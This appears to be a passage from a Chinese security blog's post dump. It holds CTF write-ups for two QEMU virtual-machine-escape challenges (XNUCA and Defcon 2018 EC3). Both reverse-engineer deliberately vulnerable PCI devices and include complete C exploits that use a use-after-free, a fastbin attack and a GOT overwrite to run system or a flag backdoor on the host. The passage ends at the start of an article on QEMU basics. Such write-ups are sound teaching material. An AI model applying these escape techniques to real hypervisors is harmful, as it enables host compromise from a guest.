0xF000) &gt;&gt; 12, (v5 &amp; 0xFF0000u) &gt;&gt; 16, (unsigned __int8)value); &#125; else if ( (_DWORD)result == 0x10 ) &#123; result = xnuca_auth(State, (unsigned int)(char)value); &#125; &#125; return result;&#125; 先看xnuca_set_timer，*(State + 0x9D0)的最低位是1，次低位是0才能进入，逻辑就是初始化了一个计时器，而且处理后将次低位置1了 1234567891011121314151617__int64 __fastcall xnuca_set_timer(__int64 State)&#123; __int64 result; // rax result = *(_DWORD *)(State + 0x9D0) &amp; 1; if ( (_DWORD)result ) &#123; result = *(_DWORD *)(State + 0x9D0) &amp; 2; if ( !(_DWORD)result ) &#123; timer_init_ns(State + 0xA00, 0, (__int64)xnuca_timer, State); result = State; *(_DWORD *)(State + 0x9D0) |= 2u; &#125; &#125; return result;&#125; 那么State + 0xA00处是一个QEMUTimer ，计时器到期时要调用xnuca_timer，先看xnuca_timer，可以看到这里free后，没有将指针置空，又是经典堆题放到了qemu 1234567891011121314151617181920212223242526272829__int64 __fastcall xnuca_timer(__int64 State)&#123; __int64 result; // rax int v2; // eax void **v3; // rbx result = *(_DWORD *)(State + 0x9D0) &amp; 4; if ( (_DWORD)result ) &#123; v2 = *(_DWORD *)(State + 0x9EC); switch ( v2 ) &#123; case 2: *(_DWORD *)(*(unsigned int *)(State + 0x9F0) + *(_QWORD *)(*(_QWORD *)(State + 0x9E0) + 8LL * *(unsigned int *)(State + 0x9E8))) = *(_DWORD *)(State + 0x9F8); break; case 3: free(*(void **)(*(_QWORD *)(State + 0x9E0) + 8LL * *(unsigned int *)(State + 0x9E8))); break; case 1: v3 = (void **)(*(_QWORD *)(State + 0x9E0) + 8LL * *(unsigned int *)(State + 0x9E8)); *v3 = malloc(*(unsigned int *)(State + 0x9F0)); break; &#125; result = State; *(_DWORD *)(State + 0x9D0) &amp;= 0xFFFFFFFB; &#125; return result;&#125; 其实这样看有点难看，默认符号表没有State结构体，经过一顿查看代码逆向，我自己就新建了一个 12345678910111213struct xnucaState&#123; _BYTE notuse[2512]; unsigned int cmd_9D0; _BYTE auth_str[8]; unsigned int count_9DC; _QWORD heaplist_9E0; _DWORD offset_9E8; _DWORD choose_9EC; _DWORD mallocSize; _QWORD value_9F8; _QWORD qemu_timer;&#125;; 再看看，是不是好看多了，那么要进入里面的漏洞代码区域，我们要使cmd_9D0&amp;4 == 1 1234567891011121314151617181920212223242526272829xnucaState *__fastcall xnuca_timer(xnucaState *State)&#123; xnucaState *result; // rax int v2; // eax void **v3; // rbx result = (xnucaState *)(State-&gt;cmd_9D0 &amp; 4); if ( (_DWORD)result ) &#123; v2 = State-&gt;choose_9EC; switch ( v2 ) &#123; case 2: *(_DWORD *)((unsigned int)State-&gt;mallocSize + *(_QWORD *)(State-&gt;heaplist_9E0 + 8LL * (unsigned int)State-&gt;offset_9E8)) = State-&gt;value_9F8; break; case 3: free(*(void **)(State-&gt;heaplist_9E0 + 8LL * (unsigned int)State-&gt;offset_9E8)); break; case 1: v3 = (void **)(State-&gt;heaplist_9E0 + 8LL * (unsigned int)State-&gt;offset_9E8); *v3 = malloc((unsigned int)State-&gt;mallocSize); break; &#125; result = State; State-&gt;cmd_9D0 &amp;= 0xFFFFFFFB; &#125; return result;&#125; 继续看xnuca_send_request，就是用来设置各种值的，将timer的超时时间设置成当前时间+10纳秒（根据qemu文档中timer_init_ns是以纳秒为单位初始化计时器），那么就相当于立刻执行，xnuca_timer 123456789101112__int64 __fastcall xnuca_send_request(xnucaState *a1, int a2, int a3, int a4, unsigned int a5)&#123; __int64 v5; // rax a1-&gt;offset_9E8 = a2; a1-&gt;choose_9EC = a3; a1-&gt;mallocSize = a4; a1-&gt;value_9F8 = a5; a1-&gt;cmd_9D0 |= 4u; v5 = qemu_clock_get_ns(1u); return timer_mod((__int64)&amp;a1-&gt;qemu_timer, v5 + 10);&#125; 最后还有xnuca_auth，就是count_9DC小于4的时候，将我们的value与a1-&gt;auth_str中的比较，相等就+1，否则置0，而count_9DC等于5，则将cmd_9D0最低位置1，同事从星将count_9DC置0 1234567891011121314151617181920xnucaState *__fastcall xnuca_auth(xnucaState *a1, char a2)&#123; xnucaState *result; // rax if ( a1-&gt;count_9DC &lt;= 4 ) &#123; if ( a1-&gt;auth_str[a1-&gt;count_9DC] == a2 ) ++a1-&gt;count_9DC; else a1-&gt;count_9DC = 0; &#125; result = (xnucaState *)a1-&gt;count_9DC; if ( (_DWORD)result == 5 ) &#123; a1-&gt;cmd_9D0 |= 1u; result = a1; a1-&gt;count_9DC = 0; &#125; return result;&#125; 那么这个auth_str什么时候设置的呢，在pci_xnuca_realize里面，这里初始化了State的各个成员了 123456789101112131415161718192021unsigned __int64 __fastcall pci_xnuca_realize(xnucaState *a1, __int64 a2)&#123; unsigned __int64 v2; // ST38_8 __int64 v3; // ST28_8 v2 = __readfsqword(0x28u); v3 = *(_QWORD *)&amp;a1-&gt;notuse[120]; a1-&gt;cmd_9D0 = 0; a1-&gt;auth_str[0] = &apos;X&apos;; a1-&gt;auth_str[1] = &apos;n&apos;; a1-&gt;auth_str[2] = &apos;u&apos;; a1-&gt;auth_str[3] = &apos;c&apos;; a1-&gt;auth_str[4] = &apos;a&apos;; a1-&gt;count_9DC = 0; a1-&gt;heaplist_9E0 = &amp;mem_buf; memset(&amp;a1-&gt;offset_9E8, 0, 0x18uLL); pci_config_set_interrupt_pin_5(v3, 1LL); memory_region_init_io(&amp;a1-&gt;notuse[2272], a1, xnuca_mmio_ops, a1, &quot;xnuca-mmio&quot;, 0x10000000LL, a2); pci_register_bar(a1, 0LL, 0LL, &amp;a1-&gt;notuse[2272]); return __readfsqword(0x28u) ^ v2;&#125; 漏洞利用利用思路：通过fastbin attack伪造fd指向free got后，修改free got为system plt的地址，最后调用free即可 这个跟defcon ec3一样，只不过这个有符号，但是给这个加了点限制，才能进入漏洞代码： 1、首先调用xnuca_timer，先得调用xnuca_set_timer初始化计时器2、而进入计时器的初始化，需要State-&gt;cmd_9D0 &amp; 1 == 1，那就需要通过xnuca_auth 5次后设置a1-&gt;cmd_9D0 |= 1u;3、最后进入xnuca_timer中的漏洞代码，需要cmd_9D0 &amp; 4 == 1，这个可以通过调用xnuca_send_request设置，不过也得必须调用xnuca_send_request来传递我们的参数 跟defcon ec3不一样的还有malloc的返回值不是0x7fxxxxxxx，所以指向直接fd劫持到got表，修改free了 最终利用代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154// -*- coding: utf-8 -*-// @Date : 2020-01-10// @Author : giantbranch// @Link : https://www.giantbranch.cn/// @tags : #include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;ctype.h&gt;#include &lt;termios.h&gt;#include &lt;assert.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;// #define MAP_SIZE 4096UL#define MAP_SIZE 0xfffffff#define MAP_MASK (MAP_SIZE - 1)char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;;unsigned char* mmio_base;unsigned char* getMMIOBase()&#123; int fd; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if(mmio_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; return mmio_base;&#125;void mmio_write(uint64_t addr, uint64_t value, uint32_t size)&#123; if (size == 1) &#123; *((uint8_t*)(mmio_base + addr)) = value; &#125;else if (size == 2) &#123; *((uint16_t*)(mmio_base + addr)) = value; &#125;else if (size == 4) &#123; *((uint32_t*)(mmio_base + addr)) = value; &#125;else if (size == 8) &#123; *((uint64_t*)(mmio_base + addr)) = value; &#125; &#125;uint32_t mmio_read(uint64_t addr)&#123; return *((uint32_t*)(mmio_base + addr));&#125;void xnuca_auth(uint32_t value)&#123; mmio_write(0x10, value, 4);&#125;void xnuca_set_timer()&#123; mmio_write(0x20, 666, 4);&#125;void xnuca_send_request(uint32_t index, uint32_t choose, uint32_t mallocSize, uint32_t value, uint32_t size)&#123; uint64_t addr = 0x30 | (index &lt;&lt; 8) | (choose &lt;&lt; 12) | (mallocSize &lt;&lt; 16); mmio_write(addr, value, size);&#125;void xnuca_malloc(uint32_t index, uint32_t mallocSize)&#123; xnuca_send_request(index, 1, mallocSize, 666, 4); // 睡眠1微秒，1μs = 1000ns usleep(1);&#125;void xnuca_edit(uint32_t index, uint32_t offset, uint64_t value, uint32_t size)&#123; xnuca_send_request(index, 2, offset, value, size); usleep(1);&#125;void xnuca_free(uint32_t index)&#123; xnuca_send_request(index, 3, 666, 666, 4); usleep(1);&#125;int main(int argc, char const *argv[])&#123; uint64_t system_plt = 0x411420; getMMIOBase(); printf(&quot;mmio_base Resource0Base: %p\\n&quot;, mmio_base); /* 1、xnuca_auth set a1-&gt;cmd_9D0 |= 1u;*/ // a1-&gt;auth_str[0] = 0x58; // a1-&gt;auth_str[1] = 0x6E; // a1-&gt;auth_str[2] = 0x75; // a1-&gt;auth_str[3] = 0x63; // a1-&gt;auth_str[4] = 0x61; xnuca_auth(0x58); xnuca_auth(0x6E); xnuca_auth(0x75); xnuca_auth(0x63); xnuca_auth(0x61); /*set timer*/ xnuca_set_timer(); //uaf: modify fd xnuca_malloc(0, 0x30); xnuca_free(0); xnuca_edit(0, 0, 0x11b92b2, 8); // try to get write access xnuca_malloc(0, 0x30); xnuca_malloc(1, 0x30); // // write system_plt to free_got xnuca_edit(1, 6, system_plt, 4); xnuca_edit(1, 6+4, 0, 4); // &gt;&gt;&gt; from pwn import * // &gt;&gt;&gt; map(hex, unpack_many(&quot;gnome-calculator&quot;)) // [&apos;0x6d6f6e67&apos;, &apos;0x61632d65&apos;, &apos;0x6c75636c&apos;, &apos;0x726f7461&apos;] // xnuca_malloc(6, 0x30); xnuca_edit(0, 0, 0x6d6f6e67, 4); xnuca_edit(0, 4, 0x61632d65, 4); xnuca_edit(0, 8, 0x6c75636c, 4); xnuca_edit(0, 12, 0x726f7461, 4); xnuca_free(0); // call free —— in fact call system_plt return 0;&#125; 最终效果——启动计算器：","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"vm escape","slug":"vm-escape","permalink":"https://www.giantbranch.cn/tags/vm-escape/"},{"name":"虚拟机逃逸","slug":"虚拟机逃逸","permalink":"https://www.giantbranch.cn/tags/虚拟机逃逸/"}]},{"title":"CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3","slug":"CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3","date":"2020-01-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/","link":"","permalink":"https://www.giantbranch.cn/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/","excerpt":"","text":"熟悉题目题目描述： 123there&apos;s a vulnerable PCI device in the qemu binary. players have to write a kernel driver for the ubuntu kernel that is thereand then they have to exploit the qemu to read flag off the fsystem 这个题目给的qemu-system-x86_64的符号是被stripped掉了，相当于增加了点难度 12giantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ file ./qemu-system-x86_64./qemu-system-x86_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, forGNU/Linux 2.6.32, BuildID[sha1]=b6c6ab3e87201dc5d18373dee7bee760367a8ffa, stripped 先看启动脚本，初步猜测漏洞在设备ooo中，肯定也是故意写的有漏洞的设备 12#!/bin/sh./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-119-generic -append &quot;priority=low console=ttyS0&quot; -device ooo -monitor /dev/null 没有符号，不能直接搜索函数名，那就尝试看看字符串 1234567891011121314.rodata:0000000000B633A1 aOooMmio db &apos;ooo-mmio&apos;,0 ; DATA XREF: sub_6E64A5+101↑o.rodata:0000000000B633AA ; char command[].rodata:0000000000B633AA command db &apos;cat ./flag&apos;,0 ; DATA XREF: sub_6E65F9+1B↑o.rodata:0000000000B633B5 ; char aD_10[].rodata:0000000000B633B5 aD_10 db &apos;%d&apos;,0Ah,0 ; DATA XREF: sub_6E65F9+27↑o.rodata:0000000000B633B9 aUint64_2 db &apos;uint64&apos;,0 ; DATA XREF: sub_6E6732+93↑o.rodata:0000000000B633C0 aDmaMask_0 db &apos;dma_mask&apos;,0 ; DATA XREF: sub_6E6732+98↑o.rodata:0000000000B633C9 aPciDevice_32 db &apos;pci-device&apos;,0 ; DATA XREF: sub_6E67DE+24↑o.rodata:0000000000B633C9 ; .rodata:0000000000B63428↓o.rodata:0000000000B633D4 align 20h.rodata:0000000000B633E0 aOooInstanceIni db &apos;ooo_instance_init&apos;,0.rodata:0000000000B633E0 ; DATA XREF: sub_6E6732+10↑o.rodata:0000000000B633F2 align 8.rodata:0000000000B633F8 aOooClassInit db &apos;ooo_class_init&apos;,0 ; DATA XREF: sub_6E67DE+14↑o 通过ooo_instance_init，ooo_class_init就可以定位到相应的函数了，此外我们看到有cat ./flag，跟过去发现sub_6E65F9是个执行system(&quot;cat ./flag&quot;)的后门函数 先看ooo_class_init，根据PCIDeviceClass的定义，可以确定这里vendor_id是0x420，device_id是0x1337，revision是0x69，class_id是0xff 12345678910111213__int64 __fastcall ooo_class_init_6E67DE(__int64 a1)&#123; __int64 result; // rax result = sub_868F66(a1, &quot;pci-device&quot;, &quot;hw/misc/oooverflow.c&quot;, 336LL, &quot;ooo_class_init&quot;); *(_QWORD *)(result + 0xC0) = sub_6E64A5; *(_QWORD *)(result + 0xC8) = 0LL; *(_WORD *)(result + 0xE0) = 0x420; *(_WORD *)(result + 0xE2) = 0x1337; *(_BYTE *)(result + 0xE4) = 0x69; *(_WORD *)(result + 0xE6) = 0xFF; return result;&#125; 从上面看出，那么sub_6E64A5就是pci_ooo_realize，里面设置了mmio（下面函数部分已经手动重命名过了） 1234567891011121314151617unsigned __int64 __fastcall pci_ooo_realize_6E64A5(__int64 a1, __int64 a2)&#123; unsigned __int64 v3; // [rsp+38h] [rbp-8h] v3 = __readfsqword(0x28u); sub_6E5C20(*(_QWORD *)(a1 + 120), 1LL); if ( !(unsigned int)sub_73A7F4(a1, 0LL, 1LL, 1LL, 0LL, a2) ) &#123; sub_6E5B0A(a1 + 2680, 1LL, sub_6E5F06, a1); sub_999AD9(a1 + 2520); sub_999D8D(a1 + 2568); sub_99A6CD((pthread_t *)(a1 + 2512), (__int64)&amp;off_B6339D, (void *(*)(void *))sub_6E631A, (void *(*)(void *))a1, 0); memory_region_init_io(a1 + 2272, a1, off_B63300, a1, &quot;ooo-mmio&quot;, 0x1000000LL); pci_register_bar(a1, 0LL, 0LL, a1 + 2272); &#125; return __readfsqword(0x28u) ^ v3;&#125; 而off_B63300就是设置mmio的操作函数指针，那么下面的sub_6E613C对应ooo_mmio_read，sub_6E61F4对应ooo_mmio_write 123.rodata:0000000000B63300 mmio_ops_off_B63300 dq offset sub_6E613C.rodata:0000000000B63300 ; DATA XREF: pci_ooo_realize_6E64A5+10A↑o.rodata:0000000000B63308 dq offset sub_6E61F4 再看ooo_instance_init，就一些初始化 12345678910111213141516171819202122232425_QWORD *__fastcall ooo_instance_init_6E6732(__int64 a1)&#123; const char ****v1; // rax const char ****v2; // ST28_8 v1 = sub_868C9E( (const char ****)a1, (const char **)&amp;off_B6339D, (__int64)&quot;hw/misc/oooverflow.c&quot;, 0x144u, (__int64)&quot;ooo_instance_init&quot;); v2 = v1; v1[853] = (const char ***)0xFFFFFFF; memset(v1 + 854, 0, 0x78uLL); memset(&amp;qword_1317940, 0, 0x78uLL); return sub_8695E3( a1, &quot;dma_mask&quot;, (__int64)&quot;uint64&quot;, (__int64)sub_6E66F3, (__int64)sub_6E66F3, 0LL, (__int64)(v2 + 853), 0);&#125; 我们看看lspci结果（简版的系统，lspci看不到详细信息），根据上面对对ooo_class_init_6E67DE的分析，的值ooo设备对应的就是下面的00:04.0 Class 00ff: 0420:1337，同时我们也可以得出lspci默认的格式序号 Class classid: vendor_id:device_id 12345678/ # lspci00:00.0 Class 0600: 8086:123700:01.0 Class 0601: 8086:700000:01.1 Class 0101: 8086:701000:01.3 Class 0680: 8086:711300:02.0 Class 0300: 1234:111100:03.0 Class 0200: 8086:100e00:04.0 Class 00ff: 0420:1337 查看mmio的地址（pmio是/proc/ioports） 12/ # cat /proc/iomem | grep 00:04.0 fb000000-fbffffff : 0000:00:04.0 或者这样也行，同样可以看到是fb000000到fbffffff 1234567891011121314/ # cat /sys/devices/pci0000\\:00/0000\\:00\\:04.0/resource0x00000000fb000000 0x00000000fbffffff 0x00000000000402000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000 重点代码分析我们根据以往经验重命名下mmio的read和write的参数 首先是read，只有(addr &amp; 0xF00000u) &gt;&gt; 20 != 15及gbuf_bss_1317940[v4]不为0才会执行memcpy memcpy的源地址是以addr的第5个四字节即v4作为gbuf_bss_1317940的索引取出值，再加一个addr的低16位进行偏移 123456789101112131415__int64 __fastcall ooo_mmio_read_6E613C(__int64 opaque, int addr, unsigned int size)&#123; unsigned int v4; // [rsp+34h] [rbp-1Ch] __int64 dest; // [rsp+38h] [rbp-18h] __int64 v6; // [rsp+40h] [rbp-10h] unsigned __int64 v7; // [rsp+48h] [rbp-8h] v7 = __readfsqword(0x28u); v6 = opaque; dest = 270441LL; v4 = (addr &amp; 0xF0000u) &gt;&gt; 16; if ( (addr &amp; 0xF00000u) &gt;&gt; 20 != 15 &amp;&amp; gbuf_bss_1317940[v4] ) memcpy(&amp;dest, (char *)gbuf_bss_1317940[v4] + (signed __int16)addr, size); return dest;&#125; 而接下看看write 12345678910111213141516171819202122232425262728293031323334353637383940414243void __fastcall ooo_mmio_write_6E61F4(__int64 opaque, __int64 addr, __int64 value, unsigned int size)&#123; unsigned int choose; // eax char value_point[12]; // [rsp+4h] [rbp-3Ch] __int64 addr_copy; // [rsp+10h] [rbp-30h] __int64 v7; // [rsp+18h] [rbp-28h] __int16 v8; // [rsp+22h] [rbp-1Eh] int i; // [rsp+24h] [rbp-1Ch] unsigned int v10; // [rsp+28h] [rbp-18h] unsigned int v11; // [rsp+2Ch] [rbp-14h] unsigned int v12; // [rsp+34h] [rbp-Ch] __int64 v13; // [rsp+38h] [rbp-8h] v7 = opaque; addr_copy = addr; *(_QWORD *)&amp;value_point[4] = value; v13 = opaque; v10 = ((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20; choose = ((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20; switch ( choose ) &#123; case 1u: free(gbuf_bss_1317940[((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16]); break; case 2u: v12 = ((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16; v8 = addr_copy; memcpy((char *)gbuf_bss_1317940[v12] + (signed __int16)addr_copy, &amp;value_point[4], size); break; case 0u: v11 = ((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16; if ( v11 == 15 ) &#123; for ( i = 0; i &lt;= 14; ++i ) gbuf_bss_1317940[i] = malloc(8LL * *(_QWORD *)&amp;value_point[4]); &#125; else &#123; gbuf_bss_1317940[v11] = malloc(8LL * *(_QWORD *)&amp;value_point[4]); &#125; break; &#125;&#125; 通过choose = ((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20;来进行选择，我命名为choose 1、choose为0时，v11为15时，循环分配15次到对应的全局变量中，否则就只分配一次到对应的全局变量索引中2、choose为1时，释放内存3、choose为2时，将我们的值写到对应的地址 上面释放内存的时候，没有将指针置空，导致了UAF漏洞，我们就可以改写堆内存的fd，使用fastbin attack去做这个题目，变成了经典的堆题目了，只不过是qemu，交互不一样。 漏洞利用利用思路：利用fastbin attack改写那个全局指针数组上面的指针，之后即可任由读写（可以改写free或者malloc的got表地址），当然这里我们只需要写即可。（当时比赛是ubuntu 16.04，不过我也是(*^__^*)，所以fastbin attack需要绕过size的检查） 注意： 1、执行mmio_write的时候，写入使用32bit写入，不然会两次调用malloc，导致第一次malloc的返回值被覆盖。还有mmap地址复制了之前的代码，mmap大小还是0x1000，导致写入失败，报错如下： 1[ 106.208240] exp[86]: segfault at 7f3dab7c4000 ip 0000000000400a69 sp 00007fffeaa50048 error 6 in exp[400000+ca000] 2、就算free了后改写了fd，也不一定第二个就能申请到fake fd的地址，这是最坑的，根据uaf.io的作者还有我最终的时间，可能qemu在我们之前就malloc了0x60大小的，或者在我们free后，qemu又free了一些0x60的，导致可能我们不止malloc两次才能得到fake fd的地址，所以我们最好循环申请，之后循环写就行3、还有就是ctrl + A，之后按X可以退出qemu虚拟机4、由于题目是部署在远程的，busybox实现了telnet和wget，所以我们可以下载我们部署在vps的exp到qemu执行，但是赛后我们方便的还行直接修改本地的文件系统，先创建一个目录（我是建立了rootfs目录），cpio复制进去，之后解压 12gunzip initramfs-busybox-x86_64.cpio.gzcpio -idmv &lt; initramfs-busybox-x86_64.cpio 最后写脚本将exp放入该目录，重新打包即可 1234giantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ cat gcc_cp.shgcc -o exp -static exp.ccp ./exp ./rootfs/cd ./rootfs &amp;&amp; find . | cpio -o --format=newc &gt; ../initramfs-busybox-x86_64.cpio.gz 最终利用我构造的内存布局如下：（0x1317980是用来构造fake size，0x1317950是循环申请是申请到的fake fd） 1234567gdb-peda$ x /12gx 0x13179400x1317940: 0x00007fffc82a4550 0x00007fffc82a43100x1317950: 0x000000000131798d 0x00007fffc829ae000x1317960: 0x00007fffc81ecdd0 0x00007fffc81ecf500x1317970: 0x0000000000000000 0x00000000000000000x1317980: 0x00007fffc82a43d0 0x00000000000000000x1317990: 0x00000000011301a0 0x0000000000000000 最终我通过改写free_got为cat flag后门函数，其实我就调用了一次free，可以看到qemu自己又free了两次。 分享一下我调试的源码： 1234567891011121314151617181920212223242526272829giantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ cat comline.txtbc#b *0x6E61F4# mallocb *0x6e629a# freeb *0x6E62D1# editb *0x6E6312run -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic \\ -kernel ./vmlinuz-4.4.0-119-generic \\ -append &quot;priority=low console=ttyS0&quot; -device ooogiantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ sudo gdb -q ./qemu-system-x86_64pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from ./qemu-system-x86_64...(no debugging symbols found)...done.gdb-peda$ source comline.txtBreakpoint 1 at 0x6e629aBreakpoint 2 at 0x6e62d1Breakpoint 3 at 0x6e6312[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.[New Thread 0x7fffd63c3700 (LWP 16385)][New Thread 0x7fffd5bc2700 (LWP 16386)][New Thread 0x7fffd53c1700 (LWP 16387)][New Thread 0x7fffce7ff700 (LWP 16388)]SeaBIOS (version rel-1.11.1-0-g0551a4be2c-prebuilt.qemu-project.org) 最终exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118// -*- coding: utf-8 -*-// @Date : 2020-01-07 10:09:50// @Author : giantbranch// @Link : http://www.giantbranch.cn/// @tags : #include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;ctype.h&gt;#include &lt;termios.h&gt;#include &lt;assert.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;// #define MAP_SIZE 4096UL#define MAP_SIZE 0x1000000#define MAP_MASK (MAP_SIZE - 1)char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;;unsigned char* mmio_base;unsigned char* getMMIOBase()&#123; int fd; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if(mmio_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; return mmio_base;&#125;void mmio_write(uint64_t addr, uint64_t value, uint32_t size)&#123; if (size == 1) &#123; *((uint8_t*)(mmio_base + addr)) = value; &#125;else if (size == 2) &#123; *((uint16_t*)(mmio_base + addr)) = value; &#125;else if (size == 4) &#123; *((uint32_t*)(mmio_base + addr)) = value; &#125;else if (size == 8) &#123; *((uint64_t*)(mmio_base + addr)) = value; &#125; &#125;uint32_t mmio_read(uint64_t addr)&#123; return *((uint32_t*)(mmio_base + addr));&#125;void ooo_malloc(uint32_t i, uint32_t malloc_size, uint32_t size)&#123; mmio_write((i&lt;&lt;16)|(0&lt;&lt;20), malloc_size/8, size);&#125;void ooo_edit(uint32_t i, uint32_t offset, uint64_t value, uint32_t size)&#123; mmio_write((i&lt;&lt;16)|(2&lt;&lt;20)|offset, value, size);&#125;void ooo_free(uint32_t i)&#123; mmio_write((i&lt;&lt;16)|(1&lt;&lt;20), 0, 1);&#125;int main(int argc, char const *argv[])&#123; uint32_t catflag_addr = 0x6E65F9; getMMIOBase(); printf(&quot;mmio_base Resource0Base: %p\\n&quot;, mmio_base); //create fake size 7f ooo_malloc(8, 0x60, 1); //uaf: modify fd ooo_malloc(0, 0x60, 1); ooo_free(0); ooo_edit(0, 0, 0x131797d, 8); // try to get write access —— 0x131795d int i = 0; for (i = 0; i &lt; 6; i++) &#123; ooo_malloc(i, 0x60, 1); &#125; // free_got = 0x11301A0 // malloc_got = 0x1130B78 // write free_got to gbuf_bss_1317940 for (i = 0; i &lt; 6; i++) &#123; ooo_edit(i, 0, 0x11301A0000000, 8); &#125; ooo_edit(10, 0, catflag_addr, 8); // write free_got ooo_free(0); // call free —— in fact call sub_6E65F9 return 0;&#125; 总结这个没符号增加了难度，需要从字符串寻找线索，需要熟悉QOM(Qemu Object Model)的知识或者根据以往题目的对比才能像正常题目一样去做题 实际是还是经典的fastbin attack的堆题目，好久没做ctf堆，有点生疏了，坑点就是qemu自身会malloc和free，导致你申请到的fake fd不固定 还有一位大佬是通过write的时候，可以设置偏移（那个是signed __int16类型，所以可以写-32768到32768），这就相当于堆溢出了，他通过堆溢出，将cat flag后门函数的地址乱写一通，覆盖了一些函数指针，最后通过调用system(&quot;echo mem &gt; /sys/power/state&quot;);，这个是让机器睡眠，调用的一些函数被覆盖成了cat flag，还是挺神奇的。 参考https://github.com/o-o-overflow/chall-ec-3https://uaf.io/exploitation/2018/05/13/DefconQuals-2018-EC3.htmlhttps://ray-cp.github.io/archivers/qemu-pwn-DefconQuals-2018-EC3https://blog.bushwhackers.ru/defconquals2018-ec3/","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"vm escape","slug":"vm-escape","permalink":"https://www.giantbranch.cn/tags/vm-escape/"},{"name":"虚拟机逃逸","slug":"虚拟机逃逸","permalink":"https://www.giantbranch.cn/tags/虚拟机逃逸/"}]},{"title":"QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读","slug":"QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读","date":"2020-01-05T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2020/01/05/QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读/","link":"","permalink":"https://www.giantbranch.cn/2020/01/05/QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读/","excerpt":"","text":"总览QEMU（quick emulator）是一款由Fabrice Bellard等人编写的免费开源的可执行硬件虚拟化的（hardware virtualization）开源托管虚拟机（VMM）。还可以为user-level的进程执行CPU仿真，进而允许了为一种架构编译的程序在另外一种架构上面运行。 qemu是一个进程启动一个虚拟机。guest关机，qemu进程就退出。为了方便可以重启guest而不用重新启动qemu，当然guest关机后再启动qemu也是可以的。 QEMU支持大端和小端的架构。 字节序转换是通过辅助函数来实现的，而不是直接访问guest的RAM。 这样就可以运行具有与host不同的字节序的目标了。 KVMKVM（Kernel Virtual 